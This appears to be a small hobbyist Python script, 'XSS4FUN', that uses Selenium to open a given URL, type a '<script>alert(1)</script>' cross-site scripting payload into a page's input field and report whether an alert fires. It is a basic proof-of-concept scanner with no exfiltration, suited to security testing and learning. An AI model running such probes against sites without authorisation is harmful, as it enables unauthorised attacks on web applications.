#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
import time
import warnings

warnings.simplefilter("ignore")
print ('='*10+'XSS4FUN'+'='*10)
print ('Author: Lucas Antoniaci')
input (' > Type any key to start...')
#Inicia navegador firefox em modo headless
options = Options()
fp = webdriver.FirefoxProfile('/home/lucas/.mozilla/firefox/0qboyvfp.selenium')
options.headless = False
browser = webdriver.Firefox(options=options,firefox_profile=fp)
print ('Firefox headless started!')
url = input('Please insert the URL for analisys...')
browser.get(url)
inputs = browser.find_elements_by_tag_name('input')
if len(inputs) > 0:
    print ('The folowwing input fields were found...')
for input in inputs:
    print (' > {}'.format(input.get_attribute('outerHTML')))
input.send_keys('<script>alert(1)</script>')
input.send_keys(Keys.ENTER)
time.sleep(3)
try:
    alert = browser.switch_to_alert()
    print (' > The payload was successful :)')
    browser.save_screenshot('xss.png')
except:
    print (' > The payload was not successful :(')
#input.send_keys(Keys.RETURN)
browser.quit()